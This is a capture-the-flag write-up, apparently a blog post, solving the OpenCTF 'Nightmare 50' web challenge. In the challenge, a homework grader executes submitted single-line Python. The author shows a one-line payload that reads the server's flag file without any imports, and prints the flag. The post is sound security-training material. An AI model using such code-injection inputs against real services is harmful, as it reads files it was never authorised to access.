---
title: "OpenCTF Nightmare 50"
date: Sun, 12 Aug 2018 20:27:00 +0000
draft: false
type: posts
categories: 
- 
---
# OpenCTF Nightmare 50

<br/>

<br/>
**Category:** Web

**Points:** 50

**Description:**

```
Automated home work scoring my ass. https://shades-of-nightmare.openctf.com/nzpoixyucvkjwnerntasdfascdvasdfqwerqwe/nightmare-50/
```

When connecting to this website in my browser, I receive the following prompt:

```
Welcome to Doctor Professor Wilson's Python 101!
Lesson 1: hello world
Enter homework for grading:
```

So it looks like this will execute the Python code you provide. So I test it with the following:

```
Welcome to Doctor Professor Wilson's Python 101!
Lesson 1: hello world
Enter homework for grading:
print('Hello world')
Hello world
```

And then it immediately closes the connection. So it looks like it only allows a single line of Python code.

I then decide to try and dump the working directory file contents. This can be done with `os.listdir('.')`, however, this would require a call to `import os`. Unfortunately, it appears some or all imports are blocked, as an error was returned. So instead, I decide to just guess that there exists a file either called `flag.txt` or `flag` in the working directory, and luckily, opening and reading files doesn’t require any imports. So I construct a one-liner to do just that: `print(open('flag.txt','r').read())`.

```
Welcome to Doctor Professor Wilson's Python 101!
Lesson 1: hello world
Enter homework for grading:
print(open('flag.txt','r').read())
ThisIsAVeryFl@ggyFlag
```

Flag
====

**ThisIsAVeryFl@ggyFlag**

#### [Source](http://b0tchsec.com/2018/openctf/nightmare50)

<br/>
---
